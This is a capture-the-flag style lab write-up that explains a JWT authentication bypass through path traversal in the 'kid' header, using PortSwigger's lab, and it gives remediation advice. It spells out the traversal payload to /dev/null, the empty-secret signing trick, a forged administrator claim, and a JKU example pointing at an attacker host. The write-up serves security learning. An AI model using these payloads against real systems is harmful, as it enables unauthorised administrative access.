# JWT Authentication Bypass via KID Header Path Traversal

## Lab

PortSwigger Web Security Academy

Difficulty: Practitioner

Category:
JWT Vulnerabilities

Vulnerability Type:

- JWT Header Manipulation
- KID Injection
- Path Traversal
- Authentication Bypass


## Vulnerability Overview

JWT headers can contain a `kid` parameter (Key ID), which identifies the key used to verify the token signature.

Example:

```json
{
    "alg":"HS256",
    "kid":"key1"
}
```

The application should use this identifier to safely retrieve a known signing key.

In this lab, the application uses the `kid` value directly as part of a filesystem path.

Because the value is user-controlled, an attacker can perform a path traversal attack and access arbitrary files.


## Objective

The objective was to forge a JWT giving administrator privileges.

Required actions:

Access:

```
/admin
```

Then delete:

```
carlos
```


## Vulnerable JWT Header

Original:

```json
{
    "alg":"HS256",
    "kid":"key1"
}
```

The server internally performs something similar to:

```
/keys/<kid>
```

Example:

```
/keys/key1
```


## Path Traversal Attack

By modifying `kid`:

```json
{
    "kid":"../../../../../../../dev/null"
}
```

The server resolves:

```
/keys/../../../../../../../dev/null
```

Result:

```
/dev/null
```


## Exploitation

The attack was performed using:

- Burp Suite
- JWT Editor Extension


A symmetric signing key was created with an empty secret:

```
secret = ""
```


The JWT header was modified:

```json
{
    "alg":"HS256",
    "kid":"../../../../../../../dev/null"
}
```


The payload was modified:

```json
{
    "sub":"administrator"
}
```


The token was signed using the empty key.

Because the server loaded `/dev/null` as the signing key, the signature matched the attacker-generated JWT.


## Attack Flow

```
Capture JWT
     |
     v
Modify kid parameter
     |
     v
Path traversal to predictable file
     |
     v
Server loads attacker-controlled key
     |
     v
Forge administrator JWT
     |
     v
Access admin panel
```


## Impact

An attacker can bypass authentication by manipulating the key lookup process.

Possible consequences:

- Authentication bypass
- Privilege escalation
- Administrative access
- Account takeover


## Root Cause

The application uses attacker-controlled input to locate cryptographic keys.

The `kid` parameter is treated as a filesystem path instead of a safe identifier.


## Remediation

Recommended fixes:

- Never use raw `kid` values as filesystem paths.
- Validate `kid` against an allowlist.
- Store keys in a secure database.
- Reject path traversal sequences.
- Normalize and validate all file paths.
- Separate user input from cryptographic key selection.


## Comparison With Other JWT Attacks

### JWK Injection

Attacker supplies the key directly:

```json
{
"jwk": {
    "public-key"
}
}
```


### JKU Injection

Attacker controls the key location:

```json
{
"jku":"https://attacker.com/key.json"
}
```


### KID Path Traversal

Attacker controls the filesystem lookup:

```json
{
"kid":"../../../../dev/null"
}
```


## Tools Used

- Burp Suite
- JWT Editor Extension
- JWT Analysis
- Path Traversal Techniques


## Skills Demonstrated

- JWT Security Testing
- Header Manipulation
- File Path Analysis
- Authentication Bypass
- Cryptographic Key Handling


## Lessons Learned

JWT security depends not only on the signing algorithm.

The entire process of selecting and loading verification keys must be secure.

A strong cryptographic algorithm cannot protect an application if the attacker can influence which key is used.
